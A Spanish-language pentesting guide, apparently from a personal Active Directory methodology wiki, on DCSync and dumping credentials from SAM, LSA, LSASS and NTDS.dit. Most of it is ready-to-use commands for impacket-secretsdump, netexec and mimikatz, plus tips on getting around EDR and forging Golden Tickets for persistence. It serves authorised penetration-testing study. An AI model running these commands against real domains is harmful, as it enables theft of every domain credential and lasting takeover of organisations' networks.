# DCSync y Volcado de Credenciales

Cuando llegas a privilegios altos en el dominio (Domain Admin, o cualquier cuenta con derechos de replicación), el objetivo final es **volcar todas las credenciales del dominio**. La técnica estrella es **DCSync**: pedirle al Domain Controller que te replique los hashes, como haría otro DC.

> Paso final de la [metodología de AD](./00%20-%20Introducci%C3%B3n.md), tras el [movimiento lateral](./Movimiento%20Lateral.md).

---

## Fuentes de credenciales en Windows

```flow
SAM (local) :: Hashes de usuarios LOCALES de una máquina.
LSA secrets :: Credenciales de servicios, autologon, cuentas cacheadas.
LSASS (memoria) :: Credenciales de sesiones activas (texto claro, hashes, tickets).
NTDS.dit (en el DC) :: La base de datos con TODOS los hashes del dominio.
```

---

## DCSync (volcar el dominio desde el DC)

Requiere los derechos **DS-Replication-Get-Changes** (los tienen Domain Admins, Enterprise Admins, y a veces cuentas mal delegadas que BloodHound te marca con el edge `DCSync`).

### Con impacket (desde Linux)

```bash
# Volcar TODO el dominio
impacket-secretsdump <dominio>/<admin>:<pass>@<DC_IP>

# Con hash (Pass-the-Hash)
impacket-secretsdump <dominio>/<admin>@<DC_IP> -hashes :<hash_NTLM>

# Solo un usuario (p.ej. krbtgt, clave para Golden Ticket)
impacket-secretsdump <dominio>/<admin>@<DC_IP> -just-dc-user krbtgt
```

### Con netexec

```bash
netexec smb <DC_IP> -u <admin> -p <pass> --ntds
```

### Con mimikatz (desde Windows)

```text
lsadump::dcsync /domain:dominio.local /user:krbtgt
lsadump::dcsync /domain:dominio.local /all
```

> **Consejo:** el hash de **`krbtgt`** es el premio gordo: permite forjar un **Golden Ticket** (un TGT válido para cualquier usuario, incluido Domain Admin) y mantener control del dominio aunque cambien contraseñas. En un pentest, volcarlo demuestra compromiso total.

---

## Volcado local (SAM / LSA / LSASS)

Cuando eres admin local en una máquina (no necesariamente el DC):

### Remoto con impacket / netexec

```bash
impacket-secretsdump <dominio>/<user>:<pass>@<IP>       # SAM + LSA + cached
netexec smb <IP> -u <user> -p <pass> --sam --lsa
```

### LSASS (credenciales de memoria)

```bash
# Remoto, con netexec (varios métodos)
netexec smb <IP> -u <user> -p <pass> -M lsassy
netexec smb <IP> -u <user> -p <pass> -M nanodump

# En Windows, con mimikatz
privilege::debug
sekurlsa::logonpasswords
```

> **Nota:** LSASS suele estar protegido por el antivirus/EDR y por **Credential Guard** en sistemas modernos. Si `sekurlsa::logonpasswords` no devuelve nada, prueba a volcar el proceso (`procdump`, `nanodump`) y procesarlo offline, o céntrate en SAM/LSA.

---

## Hashes offline del NTDS.dit (SeBackup)

Si tienes `SeBackupPrivilege` o acceso a los ficheros del DC, exfiltra la base y extrae los hashes:

```text
# En el DC (con privilegios de backup)
reg save HKLM\SYSTEM system.hive
# copia NTDS.dit vía Volume Shadow Copy (diskshadow / ntdsutil)
```

```bash
# Offline, en tu máquina
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL
```

---

## Qué hacer con los hashes volcados

```pipeline
Hashes del dominio -> Pass-the-Hash (admin) -> DCSync krbtgt -> Golden Ticket -> persistencia total
```

- **Pasar los hashes** (PtH) para entrar en cualquier máquina → [Movimiento Lateral](./Movimiento%20Lateral.md).
- **Crackear** los que puedas para contraseñas en claro → [Cracking de Hashes](../T%C3%A9cnicas%20de%20Hacking%20Fundamentales/Cracking%20de%20Hashes.md).

---

## Herramientas relacionadas

| Herramienta | Descripción |
| ----------- | ----------- |
| `impacket-secretsdump` | DCSync y volcado SAM/LSA/NTDS. |
| `netexec` (`--ntds`, `--sam`, `--lsa`, `-M lsassy`) | Volcado remoto integrado. |
| `mimikatz` | DCSync y volcado de LSASS en Windows. |
| `nanodump` / `procdump` | Volcar LSASS evadiendo protecciones. |

---

> **Consejo:** DCSync es el "jaque mate" del dominio. En cuanto BloodHound te marque que tienes (directa o indirectamente) el edge `DCSync` o llegues a Domain Admin, ejecuta `secretsdump` y saca al menos el hash de **krbtgt** y del administrador del dominio. Con eso controlas el dominio entero.
